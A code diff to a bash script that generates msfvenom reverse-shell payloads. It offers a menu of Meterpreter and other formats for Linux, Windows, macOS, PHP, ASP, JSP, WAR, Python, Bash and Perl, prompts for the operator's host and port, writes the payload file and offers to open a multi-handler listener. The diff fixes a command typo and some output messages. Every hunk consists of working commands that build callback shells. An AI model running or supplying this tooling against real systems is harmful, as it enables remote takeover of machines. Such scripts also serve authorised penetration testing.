@@ -7,7 +7,8 @@ echo "
 echo -e "MSFVENOM Reverse Shell Meterpreter Payload List"
 printf "1. Linux .elf (Meterpreter)\t2.Windows .exe (Meterpreter)\n3.MAC .macho OS\t\t\t4.PHP (Meterpreter)\n5.ASP (Meterpreter)\t\t6.JSP\n7.WAR\t\t\t\t8.Python\n9.Bash .sh\t\t\t10.Perl\n11.ASPX (Meterpreter)\n\n"
 echo -e "Local IP addresses =>"
-ip -o addr show scope global | cut -d " " -f2,7
+echo -e $(ip -o addr show scope global | cut -d " " -f2,7)
+
 echo -e "\nEnter Local Host IP Address:"
 read lhost
 echo -e "Enter Local Host Port:"
@@ -20,8 +21,8 @@ read shname
 if [ $num == 1 ] 
 then
 	echo -e "Generating Linux Reverse Shell Payload (Meterpreter)"
-	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $shname.elf && echo -e "\nshell.elf created. Have fun hacking!!\n"
-	echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
+	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $shname.elf && echo -e "\n"$shname".elf created. Have fun hacking!!\n"
+	echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n):"
 read lisn
 	case $lisn in 
 	[yY]) echo -e "opening multi handler meterpreter"
@@ -140,7 +141,7 @@ read lisn
 elif [ $num == 8 ] 
 then
 	echo -e "Generating Python Reverse Shell Payload"
-	msfvemsfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > $shname.py && printf "\nshell created.Have fun hacking!!\n"
+	msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > $shname.py && printf "\nshell created.Have fun hacking!!\n"
 echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
 read lisn
 	case $lisn in 
